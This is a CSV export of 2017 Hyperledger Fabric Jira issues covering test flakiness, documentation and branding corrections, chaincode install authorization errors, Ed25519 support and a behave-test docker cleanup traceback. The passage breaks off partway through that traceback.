TestDeliverServiceServiceUnavailable test need improvement,FAB-5006,18675,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,gennadyl,gennadyl,gennadyl,27/Jun/17 12:37 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,09/Aug/17 9:13 PM,v1.0.0-rc1,,,Future,,fabric-gossip,,,,,,0,active,gossip,,,,,"In test 2 orderers started.
Client connects to one of them and get 1 block.
After that active orderer moved to status FAIL
So it is possible to open connection to it, but for each request it replies SERVICE_UNAVALIABLE
Once client gets such status, it disconnects from orderer, wait for while and try to reconnect
But failed orderer still accept connections
So, by probabylity 1/2 it will connect to failed orderer, get same SERVICE_UNAVALIABLE, disconnect and try again
And because now we have sleep between tries, it will reach timeout after relatively small number of tries.",,gennadyl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5sn:",,,,,,,,,,,,,,,,,,,,,,,gennadyl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
go-sdk to update e2e test by setting a normal user by default and use Admin user for tests requiring Admin role,FAB-5007,18676,15549,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Baha-sk,Baha-sk,Baha-sk,27/Jun/17 1:10 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,27/Jun/17 6:17 AM,,,,,,fabric-sdk-go,,,,,,0,,,,,,,,,Baha-sk,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FABG-581,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5sv:",,,,,,Sprint 15 - Crypto,,,,,,,,,,,,,,,,,Baha-sk,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/golang.org/x/crypto-0.1.0,dependabot/go_modules/test/performance/golang.org/x/net-0.7.0,main,dependabot/go_modules/golang.org/x/net-0.7.0,dependabot/go_modules/github.com/prometheus/client_golang-1.11.1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"update ""rundailytestsuite"" to run behave tests in vitrual env",FAB-5008,18677,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,rameshthoomu,rameshthoomu,27/Jun/17 1:42 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,08/Jul/17 1:08 AM,v1.0.0-rc1,,,v1.0.0,,fabric-build,,,,,,0,build-system,,,,,,"update ""rundailytestsuite"" to run behave tests in *vitrual env.* I see behave tests are failing on python 3.5 version in CI. So, update CI ""rundailytestuite"" to run behave tests in virtualenv.",,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy447:",,,,,,,,,,,,,,,,,,,,,,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Jul/17 1:08 AM;rameshthoomu;patch has been submitted and merged.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Java CC is claimed to b supported when it's not.,FAB-5011,18681,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ChristopherFerris,rickr,rickr,27/Jun/17 3:03 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,28/Jun/17 10:05 PM,v1.0.0-rc1,,,v1.0.0-rc1,,fabric-docs,,,,,,0,,,,,,," https://hyperledger-fabric.readthedocs.io/en/latest/blockchain.html

 

You can write chaincode in several programming languages. Currently supported languages include GOLANG and Java with others coming soon.

 

Java is not supported.

 

 ",,ChristopherFerris,rickr,wyanglau,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5tr:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,rickr,wyanglau,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"27/Jun/17 11:44 PM;ChristopherFerris;https://gerrit.hyperledger.org/r/#/c/11193/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Privacy in Channels.,FAB-5012,18683,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,rickr,rickr,27/Jun/17 3:38 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,27/Jun/17 10:25 PM,v1.0.0,,,Not a Bug,,fabric-docs,,,,,,0,,,,,,,"*Privacy*

Depending on the needs of a network, participants in a Business-to-Business (B2B) network might be extremely sensitive about how much information they share. For other networks, privacy will not be a top concern.

Hyperledger Fabric supports networks where privacy (using channels) is a key operational requirement as well as networks that are comparatively open.

 

 

I have question on this and maybe it's just the wording.  But this implies for me that channels would give you privacy.  In actuality, I think you would need for applications to know when transactions are completed and fully written to the ledger. The only means to to do that is allowing an event thub.  The event hub  is free to see all blocks in the ledger.  How is privacy there? ",,mastersingh24,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5tz:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Jun/17 4:06 AM;rickr;https://hyperledger-fabric.readthedocs.io/en/latest/capabilities.html

 
h2. Privacy and confidentiality

Hyperledger Fabric enables competing business interests, and any groups that require private, confidential transactions, to coexist on the same permissioned network. Private *channels* are restricted messaging paths that can be used to provide transaction privacy and confidentiality for specific subsets of network members. All data, including transaction, member and channel information, on a channel are invisible and inaccessible to any network members not explicitly granted access to that channel.;;;","27/Jun/17 4:50 AM;mastersingh24;[~rickr] - Clients can only connect to the event hub(s) of peer(s) in their own organization.  ;;;","27/Jun/17 4:57 AM;rickr;So organization A creates channel A.  Organization B creates channel B .  Reading this I would assume each org's data is private.  Writing any type of  realistic application based on chaincode both Org A and Org B  need an event hub.  From what I've experienced that event hub will see blocks of both Org A and Org B transactions.  Where is there privacy ?;;;","27/Jun/17 5:50 PM;mastersingh24;Privacy is at the channel level.  If a peer is part of a channel, the peer has access to all of the data for all transactions on that channel.
This statement:
{noformat}
All data, including transaction, member and channel information, on a channel are invisible and inaccessible to any network members not explicitly granted access to that channel.{noformat}
is 100% accurate.   This includes the use of eventhub;;;","27/Jun/17 10:25 PM;rickr;I guess what's key here's the *inaccessible to any network members not explicitly granted access to that channel.*;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
SQL query limitations ,FAB-5013,18684,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,rickr,rickr,27/Jun/17 4:29 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,15/Jul/17 8:15 PM,v1.0.0-rc1,,,WON'T FIX,,fabric-docs,,,,,,0,,,,,,,"* [Ledger Features|https://hyperledger-fabric.readthedocs.io/en/latest/fabric_model.html#ledger-features] - The immutable, shared ledger encodes the entire transaction history for each channel, and includes SQL-like query capability for efficient auditing and dispute resolution.

 

SQL query is only availble to CC (not SDK)  and only if  couch db

 

Check with [~denyeart]",,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5u7:",,,,,,,,,,,,,,,,,,,,,,,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Assets fabric  model,FAB-5014,18686,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,rickr,rickr,27/Jun/17 5:05 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,05/Jul/17 8:32 PM,v1.0.0-rc1,,,v1.0.0,,fabric-docs,,,,,,0,,,,,,,"https://hyperledger-fabric.readthedocs.io/en/latest/fabric_model.html

 

Assets
Assets can range from the tangible (real estate and hardware) to the intangible (contracts and intellectual property). You can easily define Assets in client-side javascript and use them in your Fabric application using the included Fabric Composer tool.

Fabric supports the ability to exchange assets using unspent transaction outputs as the inputs for subsequent transactions. Assets (and asset registries) live in Fabric as a collection of key-value pairs, with state changes recorded as transactions on a Channel ledger. Fabric allows for any asset to be represented in binary or JSON format.

 

--------------------------------------------------------------------------------------------

 

This makes it sound like Assets are a central part of Fabric where there is no Asset object at all. I do agree one use of Fabric is to manage Assets – But I could use Fabric in may other other ways such as recording events.   I think this is too limiting in focus. 

The sentence on unspent transaction outputs is also extremely confusing not sure what it's meant to communicate.  Also Channel ledger is introduced is this different the just the ledger ?",,binhn,mastersingh24,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5uf:",,,,,,,,,,,,,,,,,,,,,,,binhn,mastersingh24,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"27/Jun/17 12:04 PM;binhn;{quote}the ability to exchange assets using unspent transaction outputs as the inputs for subsequent transactions
{quote}
That sounds like a copy from bitcoin document. Data in Fabric is modeled like object, which is completely encapsulated by a chaincode; that is, the only way to access the data created by a chaincode is through the chaincode. It is much more low level (flexible) than unspent or spent transactions. 

I would suggest change to ""the ability to modify assets using chaincode transactions"";;;","04/Jul/17 11:59 PM;mastersingh24;https://gerrit.hyperledger.org/r/11355;;;","05/Jul/17 8:32 PM;mastersingh24;I'm closing this as I think the updates I made make sense.  Feel free to re-open;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
GetQueryResult in MockStub should be customizable,FAB-5015,18688,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,Sneljo,atakada,atakada,27/Jun/17 5:55 AM,26/Oct/18 8:02 AM,28/Oct/23 3:00 AM,26/Oct/18 8:02 AM,v1.0.0,v1.0.5,v1.1.0-preview,Future,,fabric-ledger,,,,,,2,chaincode,,,,,,"MockStub[1] cannot be applied for testing a chaincode that depends on GetQueryResult[2] to execute rich query, since MockStub doesn't provide implementation of GetQueryResult but simply returns ""Not Implemented"" error[3].

As the ideal behavior of GetQueryResult varies from the underlying state DB,  MockStub should provide a capability to inject a GetQueryResult stub  customized for the test, not a concrete and full implementation of GetQueryResult.

[1] [https://github.com/hyperledger/fabric/blob/master/core/chaincode/shim/mockstub.go]

[2] [https://github.com/hyperledger/fabric/blob/master/core/chaincode/shim/interfaces.go#L138]

[3] [https://github.com/hyperledger/fabric/blob/master/core/chaincode/shim/mockstub.go#L223]

 ",,atakada,medikent,Mihir2.0,rhegde,Sneljo,zonkedhazmat,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy5un:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,atakada,medikent,Mihir2.0,rhegde,Sneljo,zonkedhazmat,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"10/Jan/18 6:13 PM;Sneljo;https://gerrit.hyperledger.org/r/c/16325/;;;","26/Jun/18 12:34 PM;zonkedhazmat;Is there any updates on this? ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"RTD license.html uses ""The Hyperledger Project""",FAB-5018,18692,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,tkuhrt,tkuhrt,tkuhrt,27/Jun/17 6:21 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,27/Jun/17 7:45 PM,,,,v1.0.0,,fabric-docs,,,,,,0,Documentation,v1.0,,,,,"[http://hyperledger-fabric.readthedocs.io/en/latest/license.html] references ""The Hyperledger Project"". This should be changed to ""Hyperledger"" to meet branding requirements.",,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5uv:",,,,,,,,,,,,,,,,,,,,,,,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"27/Jun/17 8:21 AM;tkuhrt;https://gerrit.hyperledger.org/r/11171;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
RTD license.html refers only to Apache license and not the CC-BY-4.0,FAB-5019,18693,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,ChristopherFerris,tkuhrt,tkuhrt,27/Jun/17 6:23 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,27/Jun/17 10:57 PM,,,,v1.0.0,,fabric-docs,,,,,,0,Documentation,v1.0,,,,,"[http://hyperledger-fabric.readthedocs.io/en/latest/license.html] says that Hyperledger uses the Apache 2.0 license.  This is true for source code; however, for documentation, the license is CC-BY-4.0. Because this license information exists in the documentation, I was expecting to see CC-BY-4.0. I guess we should change this to be more specific and include both licenses (source code and documentation).",,ChristopherFerris,mastersingh24,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5v3:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,mastersingh24,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"27/Jun/17 5:44 PM;mastersingh24;[~tkuhrt] - If we do that, can we get rid of the big *ugly* CC license text in the top left of the navigation?  Seems like overkill to have the CC license in the nav and having it on the license page.;;;","27/Jun/17 7:54 PM;ChristopherFerris;My preference would be remove the license.rst altogether. It adds no value. The LICENSE speaks for itself. As for the ugly ccby in the RTD margin, someone needs to fix the CSS. Maybe we can get Sean or someone on that. ;;;","27/Jun/17 9:49 PM;ChristopherFerris;https://gerrit.hyperledger.org/r/11187;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Modify RTD questions.html to specify using hyperledger-fabric tag in SO,FAB-5020,18694,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tkuhrt,tkuhrt,tkuhrt,27/Jun/17 6:28 AM,21/Jul/18 3:53 AM,28/Oct/23 3:00 AM,01/Nov/17 2:45 AM,,,,v1.0.0,,fabric-docs,,,,,,0,Documentation,v1.0,,,,,[http://hyperledger-fabric.readthedocs.io/en/latest/questions.html] points readers to the main hyperledger tag in SO. It would be worthwhile to specify that the user tag new issues with hyperledger-fabric.,,ChristopherFerris,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy5vb:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,ChristopherFerris,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Jul/17 8:04 AM;tkuhrt;https://gerrit.hyperledger.org/r/11835;;;","23/Jul/17 3:14 AM;ChristopherFerris;I actually already caught this in https://gerrit.hyperledger.org/r/#/c/11829/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
RTD status.html does not meet brand guidelines,FAB-5021,18696,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ChristopherFerris,tkuhrt,tkuhrt,27/Jun/17 7:19 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,27/Jun/17 10:20 PM,,,,v1.0.0,,fabric-docs,,,,,,0,Documentation,v1.0,,,,,[http://hyperledger-fabric.readthedocs.io/en/latest/status.html] refers to the Fabric wiki page. Change to Hyperledger Fabric wiki page to meet brand guidelines.,,ChristopherFerris,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5vj:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"27/Jun/17 8:03 PM;ChristopherFerris;https://gerrit.hyperledger.org/r/11183;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"RTD copyright refers to ""hyperledger""",FAB-5022,18697,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ChristopherFerris,tkuhrt,tkuhrt,27/Jun/17 7:22 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,27/Jun/17 10:20 PM,,,,v1.0.0,,fabric-docs,,,,,,0,Documentation,v1.0,,,,,"The copyright on the bottom of the Read-the-Docs pages has ""© Copyright 2017, hyperledger."" This should be changed to ""© Copyright 2017, Hyperledger."" 

In other words, capitalize Hyperledger in the copyright notice.",,ChristopherFerris,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5vr:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"27/Jun/17 8:19 PM;ChristopherFerris;https://gerrit.hyperledger.org/r/11185;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
RTD Index does not meet brand guidelines,FAB-5023,18698,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,tkuhrt,tkuhrt,tkuhrt,27/Jun/17 7:28 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,27/Jun/17 7:44 PM,,,,v1.0.0,,fabric-docs,,,,,,0,Documentation,v1.0,,,,,"[http://hyperledger-fabric.readthedocs.io/en/latest/index.html] refers in multiple locations to Fabric instead of Hyperledger Fabric.  According to the brand guidelines, we should not drop the word Hyperledger from the name of the framework.",,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5vz:",,,,,,,,,,,,,,,,,,,,,,,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"27/Jun/17 7:37 AM;tkuhrt;https://gerrit.hyperledger.org/r/11167;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Enable Ed25519 signature,FAB-5025,18702,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,guhaihua,guhaihua,guhaihua,27/Jun/17 3:02 PM,15/Sep/20 12:34 AM,28/Oct/23 3:00 AM,22/May/18 9:29 PM,,,,Abandoned,,fabric-crypto,,,,,,0,,,,,,,"Currently, Ed21159 signature is not supported by BCCSP. Ed25519 signature is efficient than ECDSA over prime field. And Ed25519 is considered in the draft of TLS1.3.See the details in Section 4.2.3 Signature Algorithm of  draft-ietf-tls-tls12-20 which can be got from https://tools.ietf.org/pdf/draft-ietf-tls-tls13-20.pdf.

 ",,caduellery,ChristopherFerris,denyeart,guhaihua,kchristidis,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzx2lr:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,caduellery,ChristopherFerris,denyeart,guhaihua,kchristidis,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Oct/17 9:07 PM;mastersingh24;Moving this out to 1.2;;;","23/Mar/18 2:07 PM;denyeart;Many issues were bulk moved from v1.0 or v1.1 to v1.2 as part of a cleanup effort, and many of these issues are not high priority or actually intended to be worked for v1.2.  This issue is being bulk moved to Future.  If the issue is indeed high priority for v1.2 and/or very low effort, please move back to v1.2 and add a comment to indicate rationale.;;;","29/Mar/18 2:44 AM;ChristopherFerris;The CR has been previously submitted and rebased [https://gerrit.hyperledger.org/r/c/10771/];;;","21/Apr/18 8:02 AM;kchristidis;Given that all of the work for this has already been done, and this particular one doesn't seem to increase our surface in radical new ways, I think that no additional justification is needed to add it to 1.2.

Thoughts? Let's decide promptly while the CR is still current.;;;","15/Sep/20 12:34 AM;caduellery;It would be really nice to have this...

[https://golang.org/pkg/crypto/ed25519/]

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
No useful error response received if install chaincode fails due to authorisation failure,FAB-5026,18703,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,harrisob@us.ibm.com,davidkel,davidkel,27/Jun/17 3:39 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,18/Jul/17 1:04 AM,v1.0.0-rc1,,,v1.0.1,,fabric-sdk-go,fabric-sdk-node,fabric-sdk-py,,,,0,node-SDK,,,,,,"I attempt to install chaincode onto a peer through the node sdk but instead of using a peer admin cert, I use a cert obtained from the CA (which would be valid for submitting transactions). This should fail and it does fail however the node sdk returns no error message to indicate the issue you only get an Error object with no message. This could be an issue with the peer itself not sending back any useful error message rather than a problem with the node sdk.

Specifically using Hyperledger Composer, the response to the user looks like
{code:java}
Error: error trying to deploy. Error: error trying to install chaincode. Error
{code}
 The final Error part would contain the response from hyperledger fabric but as seen here there is no message",,ChristopherFerris,davidkel,harrisob@us.ibm.com,muralisr,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,FAB-5150,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5wn:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,davidkel,harrisob@us.ibm.com,muralisr,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,dev,main,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Jun/17 1:17 AM;ChristopherFerris;[~davidkel] can you please confirm the version you're using?;;;","28/Jun/17 1:53 AM;davidkel;Sorry, missed the affects Versions.;;;","30/Jun/17 3:29 AM;harrisob@us.ibm.com;With RC1 I am seeing the following error when I use a non-admin to install

Error: chaincode error (status: 500, message: Authorization for INSTALL on + github.com/example_ccend2endnodesdkv0���������

Which does indicate an issue with the authorization.;;;","30/Jun/17 4:09 AM;muralisr;Taking a quick look I see the peer sends back
{code:java}
Authorization for INSTALL on %s has been denied with error - <more error here>{code}
This should be available in the Response's Message field with Status = 500.;;;","30/Jun/17 4:18 AM;muralisr;Didn't see [~harrisob@us.ibm.com] comment till I posted mine. While SDK has error to log ""authorization failure on install"" error , the peer can output a better error too (basically remove the binary blob). Suggest we fix this JIRA with two tasks (1) SDK to output the right error and (2) peer to return a better error. 

I would say this is not a blocking issue for 1.0.;;;","04/Jul/17 11:36 PM;muralisr;moving this to SDK now that the returned error has been cleaned to not contain bin data ( -FAB-5150- ). 

 

Also tagged other SDKs besides node in case they held off reporting Install error.;;;","13/Jul/17 1:42 AM;jimthematrix;[~davidkel] can you confirm that with 1.0.0 you are seeing the proper error? from what [~harrisob@us.ibm.com] wrote above the error was already being reported by the node SDK.;;;","13/Jul/17 5:43 AM;rickr;Removing java SDK if the peer gives a good error message I have seen for other errors we give this to the user.;;;","15/Jul/17 12:10 AM;harrisob@us.ibm.com;NodeSDK is now seeing and returning

Error: chaincode error (status: 500, message: Authorization for INSTALL has been denied (error-Failed verifying that proposal's creator satisfies local MSP principal during channelless check policy with policy [Admins]: [This identity is not an admin]));;;","15/Jul/17 1:28 AM;harrisob@us.ibm.com;Adding test case to verify we get an error when using non admin user

https://gerrit.hyperledger.org/r/#/c/11651/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Docker cleanup fails after finishing test scenario,FAB-5028,18706,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,nemoto,nemoto,nemoto,27/Jun/17 6:31 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,05/Aug/17 9:13 PM,v1.0.0-rc1,,,Future,,fabric-quality,,,,,,0,,,,,,,"When I executed behave tests in fabric/test/feature, I met an error.
 I think ""docker inspect"" was executed for a docker which was listed by ""docker ps"" but already deleted. If so, error handling should be improved. 
{noformat}
$ behave peer.feature -n FAB-3505 --no-capture
(...snip)
Query Exec command: /bin/bash -c ""CORE_PEER_MSPCONFIGPATH=/var/hyperledger/configs/4730032a5a6811e78e6bfa163e2101ee/peerOrganizations/org2.example.com/users/Admin@org2.example.com/m
When a user queries on the chaincode named ""mycc"" with args [""query"",""a""] on ""peer0.org2.example.com"" # steps/endorser_impl.py:68 148.622s
{\""Args\"": [\""query\"",\""a\""]}' --channelID behavesystest ""
Then a user receives expected response of 980 from ""peer0.org2.example.com"" # steps/endorser_impl.py:150 0.000s
Error: No such object: Error
Exception CalledProcessError: Command '['docker', 'inspect', 'Error']' returned non-zero exit status 1
Traceback (most recent call last):
File ""/usr/local/bin/behave"", line 11, in <module>
sys.exit(main())
File ""/usr/local/lib/python2.7/dist-packages/behave/__main__.py"", line 109, in main
failed = runner.run()
File ""/usr/local/lib/python2.7/dist-packages/behave/runner.py"", line 672, in run
return self.run_with_paths()
File ""/usr/local/lib/python2.7/dist-packages/behave/runner.py"", line 693, in run_with_paths
return self.run_model()
File ""/usr/local/lib/python2.7/dist-packages/behave/runner.py"", line 483, in run_model
failed = feature.run(self)
File ""/usr/local/lib/python2.7/dist-packages/behave/model.py"", line 523, in run
failed = scenario.run(runner)
File ""/usr/local/lib/python2.7/dist-packages/behave/model.py"", line 1255, in run
failed = scenario.run(runner)
File ""/usr/local/lib/python2.7/dist-packages/behave/model.py"", line 919, in run
runner.run_hook('after_scenario', runner.context, self)
File ""/usr/local/lib/python2.7/dist-packages/behave/runner.py"", line 405, in run_hook
self.hooks[name](context, *args)
File ""environment.py"", line 64, in after_scenario
context.composition.decompose()
File ""/home/nemoto/go/src/github.com/hyperledger/fabric/test/feature/steps/compose_util.py"", line 201, in decompose
self.issueCommand([""down""])
File ""/home/nemoto/go/src/github.com/hyperledger/fabric/test/feature/steps/compose_util.py"", line 174, in issueCommand
self.rebuildContainerData()
File ""/home/nemoto/go/src/github.com/hyperledger/fabric/test/feature/steps/compose_util.py"", line 181, in rebuildContainerData
